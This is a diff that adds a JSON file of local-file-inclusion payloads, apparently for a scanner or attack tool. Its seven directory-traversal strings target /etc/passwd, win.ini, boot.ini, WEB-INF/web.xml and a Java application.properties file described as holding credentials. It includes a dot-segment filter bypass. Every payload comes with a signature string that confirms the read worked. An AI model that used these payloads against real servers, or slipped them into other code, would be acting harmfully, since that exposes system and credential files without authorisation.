@@ -1,0 +1,46 @@
+{
+  "lfi_payloads": [
+    {
+      "name": "Deep Windows Traversal",
+      "payload": "../../../../../../../../../../../../windows/win.ini",
+      "description": "Deep traversal to ensure we hit the C: root on enterprise Windows servers.",
+      "signature": "[extensions]"
+    },
+    {
+      "name": "Windows Boot Ini",
+      "payload": "../../../../../../../../../../../../boot.ini",
+      "description": "Targets the legacy Windows boot configuration file.",
+      "signature": "[boot loader]"
+    },
+    {
+      "name": "JSP Web Configuration",
+      "payload": "/WEB-INF/web.xml",
+      "description": "Specific to Java/JSP servers. Tries to read the internal web configuration file.",
+      "signature": "<web-app"
+    },
+    {
+      "name": "Standard Linux (Fallback)",
+      "payload": "../../../../../../../../etc/passwd",
+      "description": "Deep directory traversal for Linux systems.",
+      "signature": "root:x:0:0"
+    },
+    {
+      "name": "Java Classes Bypass",
+      "payload": "/WEB-INF/classes/application.properties",
+      "description": "Attempts to find Java application credential files.",
+      "signature": "jdbc:"
+    },
+    {
+      "name": "Dot-Segment Bypass",
+      "payload": "/./././././././././././etc/passwd",
+      "description": "Bypasses some poorly written '.. /' filters using single-dot segments.",
+      "signature": "root:x:0:0"
+    },
+    {
+      "name": "Windows absolute (Direct)",
+      "payload": "C:\\Windows\\win.ini",
+      "description": "Directly targets the Windows initialization file using an absolute path.",
+      "signature": "[fonts]"
+    }
+  ]
+}
